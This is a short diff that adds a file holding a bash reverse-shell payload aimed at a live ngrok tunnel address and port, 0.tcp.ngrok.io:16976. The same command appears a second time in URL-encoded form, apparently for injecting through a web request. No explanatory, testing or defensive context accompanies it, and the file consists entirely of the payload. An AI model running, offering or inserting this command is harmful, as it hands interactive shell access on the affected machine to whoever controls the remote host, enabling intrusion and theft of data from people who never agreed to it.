@@ -1,0 +1,3 @@
+bash -i >& /dev/tcp/0.tcp.ngrok.io/16976 0>&1
+
+bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F0.tcp.ngrok.io%2F16976%200%3E%261
